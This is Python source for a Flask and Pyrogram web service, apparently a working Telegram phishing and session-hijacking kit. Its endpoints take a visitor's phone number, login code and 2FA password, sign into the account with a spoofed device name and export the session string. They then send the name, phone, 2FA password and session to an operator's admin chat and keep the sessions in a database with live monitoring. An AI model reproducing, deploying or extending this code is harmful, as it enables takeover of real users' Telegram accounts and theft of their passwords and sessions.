import os
import asyncio
import sqlite3
import html
import logging
import requests
from flask import Flask, request, jsonify, send_from_directory
from pyrogram import Client, errors, enums
from pyrogram.errors import (
    AuthKeyUnregistered,
    SessionRevoked,
    UserDeactivated,
    UserDeactivatedBan,
    Unauthorized,
    AuthKeyInvalid,
    FloodWait,
)
from pyrogram.types import ChatMemberUpdated

# ─── LOGGING CONFIGURATION ───
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] - %(message)s"
)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder='.', static_url_path='')

API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

# 🛠 បំប្លែង ADMIN_CHAT_ID ទៅជា Integer ប្រសិនបើវាជាលេខ ID ជៀសវាង Error Peer ID
raw_admin_chat = os.getenv("ADMIN_CHAT_ID", "")
if raw_admin_chat.lstrip('-').isdigit():
    ADMIN_CHAT_ID = int(raw_admin_chat)
else:
    ADMIN_CHAT_ID = raw_admin_chat

# 🛠 បំប្លែង TARGET_CHANNEL_ID ទៅជា Integer
raw_target = os.getenv("TARGET_CHANNEL_ID", os.getenv("ADMIN_CHAT_ID", ""))
if raw_target.lstrip('-').isdigit():
    TARGET_CHANNEL_ID = int(raw_target)
else:
    TARGET_CHANNEL_ID = raw_target

temp_clients = {}
active_monitors = {}
STATIC_INVITE_LINK = "https://t.me/+bDGHiHUCt_MwOWY9"

# Exceptions ទាំងឡាយណាដែលបញ្ជាក់ច្បាស់ថា Session ត្រូវបានគេ Terminate / Logout
TERMINATION_EXCEPTIONS = (
    AuthKeyUnregistered,
    SessionRevoked,
    UserDeactivated,
    UserDeactivatedBan,
    Unauthorized,
    AuthKeyInvalid,
)

MAX_CONSECUTIVE_ERRORS = 15

# ─── HIGH-PERFORMANCE SQLITE DATABASE HELPER ───
DB_PATH = "data/sessions.db"

def get_db():
    """ បើក Connection ជាមួយ WAL Mode ដើម្បីការពារ Database Locked """
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH, timeout=20.0)
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.execute("PRAGMA synchronous=NORMAL;")
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS active_sessions (
                phone TEXT PRIMARY KEY,
                user_id INTEGER,
                session TEXT NOT NULL,
                msg_id INTEGER
            )
        ''')
        conn.commit()

def save_active_session(phone, user_id, session_str, msg_id):
    with get_db() as conn:
        conn.execute('''
            INSERT OR REPLACE INTO active_sessions (phone, user_id, session, msg_id)
            VALUES (?, ?, ?, ?)
        ''', (phone, user_id, session_str, msg_id))
        conn.commit()

def remove_active_session(phone):
    with get_db() as conn:
        conn.execute('DELETE FROM active_sessions WHERE phone = ?', (phone,))
        conn.commit()

def get_all_active_sessions():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT phone, user_id, session, msg_id FROM active_sessions')
        return cursor.fetchall()

def is_user_session_active(user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT 1 FROM active_sessions WHERE user_id = ?', (user_id,))
        return cursor.fetchone() is not None

init_db()

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ─── BOT CLIENT SETUP FOR LISTENING EVENTS ───
bot_client = None
if BOT_TOKEN:
    bot_client = Client(
        name="guard_bot",
        api_id=API_ID,
        api_hash=API_HASH,
        bot_token=BOT_TOKEN,
        in_memory=True
    )

def parse_device_info(user_agent=""):
    device_model = "Mobile App"
    system_version = "Android 13"
    if "iPhone" in user_agent or "iPad" in user_agent:
        device_model = "iPhone"
        system_version = "iOS 17.0"
    elif "Windows" in user_agent:
        device_model = "PC Desktop"
        system_version = "Windows 11"
    elif "Macintosh" in user_agent:
        device_model = "MacBook Pro"
        system_version = "macOS Sonoma"
    return device_model, system_version

# ─── TELEGRAM BOT API HELPER (USES REQUESTS VIA ASYNC THREAD) ───
def _sync_bot_api_post(method: str, data: dict):
    if not BOT_TOKEN:
        return {"ok": False, "description": "No BOT_TOKEN"}
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        res = requests.post(url, json=data, timeout=10)
        return res.json()
    except Exception as e:
        logger.error(f"Error calling Telegram API {method}: {e}")
        return {"ok": False, "description": str(e)}

async def bot_api_post(method: str, data: dict):
    """ មុខងារហៅ Telegram API ដោយមិនបាច់ប្រើ aiohttp """
    return await asyncio.to_thread(_sync_bot_api_post, method, data)

async def kick_user_from_chat(chat_id, user_id):
    if not chat_id or not user_id:
        return
    # 1. Ban Member
    res1 = await bot_api_post("banChatMember", {"chat_id": chat_id, "user_id": user_id})
    if res1.get("ok"):
        # 2. Unban Member វិញដើម្បីអនុវត្តការ Kick
        await bot_api_post("unbanChatMember", {"chat_id": chat_id, "user_id": user_id, "only_if_banned": True})
        logger.info(f"⚡ FAST KICK: Successfully kicked user {user_id} from chat {chat_id}")
    else:
        logger.error(f"Failed to kick user {user_id}: {res1.get('description')}")

async def delete_admin_message(chat_id, message_id):
    if not chat_id or not message_id:
        return
    # 1. ព្យាយាម Delete សារ
    res = await bot_api_post("deleteMessage", {"chat_id": chat_id, "message_id": int(message_id)})
    if res.get("ok"):
        logger.info(f"🗑️ Successfully deleted message {message_id} from Admin Chat.")
    else:
        logger.warning(f"Delete failed: {res.get('description')}. Attempting edit instead...")
        # 2. បើ Delete មិនបាន (ឧ. លើស 48 ម៉ោងក្នុង Private Chat) -> Edit សារជំនួស
        edit_res = await bot_api_post("editMessageText", {
            "chat_id": chat_id,
            "message_id": int(message_id),
            "text": "🔴 <b>[SESSION TERMINATED & REMOVED]</b>\n\n<i>(Session នេះត្រូវគេ Terminated រួចរាល់ Data ត្រូវបានលុបចេញពី System)</i>",
            "parse_mode": "HTML"
        })
        if edit_res.get("ok"):
            logger.info(f"✏️ Successfully edited message {message_id}.")
        else:
            logger.error(f"Failed to edit message {message_id}: {edit_res.get('description')}")

# ─── REAL-TIME MONITORING PER SESSION ───
async def monitor_single_session(phone, user_id, session_str, msg_id):
    consecutive_errors = 0
    backoff_delay = 5

    while True:
        is_terminated = False
        client = None
        try:
            client = Client(
                name=f"mon_{phone.replace('+', '')}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session_str,
                in_memory=True
            )
            await client.connect()
            consecutive_errors = 0
            backoff_delay = 5

            while True:
                await client.get_me()
                await asyncio.sleep(15)

        except TERMINATION_EXCEPTIONS as e:
            is_terminated = True
            logger.error(f"🚨 TERMINATION DETECTED for {phone} ({type(e).__name__})!")

        except FloodWait as e:
            logger.warning(f"FloodWait on session {phone}: sleeping {e.value}s")
            await asyncio.sleep(e.value)

        except Exception as e:
            consecutive_errors += 1
            logger.warning(f"⚠️ Connection check error on {phone} ({type(e).__name__}): {e} "
                           f"[retry {consecutive_errors}/{MAX_CONSECUTIVE_ERRORS}]")

        finally:
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        if is_terminated:
            # 1. Kick User ចេញពី Target Channel
            if TARGET_CHANNEL_ID and user_id:
                await kick_user_from_chat(TARGET_CHANNEL_ID, user_id)

            # 2. លុប (ឬ Edit) សារ notification ក្នុង Admin Chat
            if ADMIN_CHAT_ID and msg_id:
                await delete_admin_message(ADMIN_CHAT_ID, msg_id)

            # 3. Cleanup DB និង Active Task List
            remove_active_session(phone)
            active_monitors.pop(phone, None)
            return

        if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
            logger.error(f"⛔ Giving up monitoring {phone} after {MAX_CONSECUTIVE_ERRORS} failed retries.")
            active_monitors.pop(phone, None)
            return

        await asyncio.sleep(backoff_delay)
        backoff_delay = min(backoff_delay * 1.5, 60)

# ─── LISTEN & KICK NEW MEMBERS WHO HAVE NO SESSION ───
if bot_client:
    @bot_client.on_chat_member_updated()
    async def auto_kick_non_session_members(client, chat_member_updated: ChatMemberUpdated):
        try:
            if str(chat_member_updated.chat.id) != str(TARGET_CHANNEL_ID):
                return

            new_member = chat_member_updated.new_chat_member
            if not new_member or new_member.user.is_bot:
                return

            user_id = new_member.user.id
            
            if new_member.status in [enums.ChatMemberStatus.MEMBER, enums.ChatMemberStatus.RESTRICTED]:
                if not is_user_session_active(user_id):
                    logger.info(f"🚫 Kicking Unauthorized Member {user_id} (No active session in DB)...")
                    await kick_user_from_chat(TARGET_CHANNEL_ID, user_id)
                else:
                    logger.info(f"✅ Allowed Member {user_id} (Session active in DB).")
        except Exception as e:
            logger.error(f"Error in member guard listener: {e}")

async def start_all_monitors():
    sessions = get_all_active_sessions()
    for phone, user_id, session_str, msg_id in sessions:
        if phone not in active_monitors:
            task = asyncio.create_task(monitor_single_session(phone, user_id, session_str, msg_id))
            active_monitors[phone] = task

async def async_send_code(phone_number, user_agent):
    device_model, system_version = parse_device_info(user_agent)
    client = Client(
        name=f"session_{phone_number.replace('+', '')}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
        device_model=device_model,
        system_version=system_version,
        app_version="10.2.1",
        lang_code="en"
    )
    await client.connect()
    sent = await client.send_code(phone_number)
    temp_clients[phone_number] = {
        "client": client,
        "phone_code_hash": sent.phone_code_hash
    }
    return True

async def async_verify_code(phone_number, code, password):
    session_data = temp_clients.get(phone_number)
    if not session_data:
        raise Exception("Session expired. Please request OTP again.")

    client = session_data["client"]
    phone_code_hash = session_data["phone_code_hash"]

    try:
        if password:
            await client.check_password(password)
        else:
            await client.sign_in(phone_number, phone_code_hash, code)
    except errors.SessionPasswordNeeded:
        return {"requires_password": True}

    me = await client.get_me()
    user_id = me.id
    username = f"@{me.username}" if me.username else "No Username"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "N/A"

    session_string = await client.export_session_string()
    await client.disconnect()
    temp_clients.pop(phone_number, None)

    msg_id = None
    if BOT_TOKEN and ADMIN_CHAT_ID:
        two_fa_text = password if password else "None"

        full_name_safe = html.escape(full_name)
        username_safe = html.escape(username)
        two_fa_safe = html.escape(two_fa_text)
        session_safe = html.escape(session_string)

        msg = (
            "🟢 <b>New Active Telegram Session Logged In!</b>\n\n"
            f"👤 <b>Name:</b> {full_name_safe}\n"
            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f"🏷 <b>Username:</b> {username_safe}\n"
            f"📱 <b>Phone:</b> <code>{html.escape(phone_number)}</code>\n"
            f"🔐 <b>2FA :</b> <code>{two_fa_safe}</code>\n\n"
            f"🔑 <b>Pyrogram Session String:</b>\n<code>{session_safe}</code>"
        )
        res = await bot_api_post("sendMessage", {
            "chat_id": ADMIN_CHAT_ID,
            "text": msg,
            "parse_mode": "HTML"
        })
        if res.get("ok"):
            msg_id = res["result"]["message_id"]
        else:
            logger.error(f"Error sending msg to Admin chat: {res.get('description')}")

    # រក្សាទុកក្នុង DB (ជាមួយ WAL mode)
    save_active_session(phone_number, user_id, session_string, msg_id)

    # បង្កើត Real-Time Monitoring Task ភ្លាមៗ
    task = asyncio.create_task(monitor_single_session(phone_number, user_id, session_str=session_string, msg_id=msg_id))
    active_monitors[phone_number] = task

    return {
        "success": True,
        "message": "Authentication successful!",
        "session": session_string,
        "redirectUrl": STATIC_INVITE_LINK
    }

# ─── FLASK ROUTES ───
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/IMG_8300.jpeg')
def serve_logo():
    return send_from_directory('.', 'IMG_8300.jpeg')

@app.route('/api/send-code', methods=['POST'])
def send_code():
    data = request.json or {}
    phone_number = data.get('phoneNumber')
    if not phone_number:
        return jsonify({"success": False, "error": "Phone number is required"}), 400

    phone_number = phone_number.strip()
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    user_agent = request.headers.get('User-Agent', '')

    try:
        future = asyncio.run_coroutine_threadsafe(async_send_code(phone_number, user_agent), loop)
        future.result()
        return jsonify({"success": True, "message": "OTP code sent to your Telegram app!"})
    except Exception as err:
        return jsonify({"success": False, "error": str(err)}), 500

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json or {}
    phone_number = data.get('phoneNumber')
    code = data.get('code')
    password = data.get('password')

    if not phone_number or not code:
        return jsonify({"success": False, "error": "Phone number and OTP code are required"}), 400

    phone_number = phone_number.strip()
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    try:
        future = asyncio.run_coroutine_threadsafe(async_verify_code(phone_number, code, password), loop)
        res = future.result()
        if res.get("requires_password"):
            return jsonify({"success": False, "requiresPassword": True, "error": "Two-Step Verification (2FA) password is required."}), 401
        return jsonify(res)
    except Exception as err:
        return jsonify({"success": False, "error": str(err)}), 400

async def start_services():
    global TARGET_CHANNEL_ID
    if bot_client:
        await bot_client.start()
        logger.info("Guard Bot Service started successfully!")
        
        if TARGET_CHANNEL_ID:
            res = await bot_api_post("getChat", {"chat_id": TARGET_CHANNEL_ID})
            if res.get("ok"):
                chat_title = res["result"].get("title", "Target Chat")
                logger.info(f"✅ Target Channel linked successfully: {chat_title} ({TARGET_CHANNEL_ID})")
            else:
                logger.warning(f"⚠️ Telegram API Notice: {res.get('description')}")
    
    await start_all_monitors()

if __name__ == '__main__':
    import threading
    threading.Thread(target=loop.run_forever, daemon=True).start()

    asyncio.run_coroutine_threadsafe(start_services(), loop)

    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port, threaded=True)
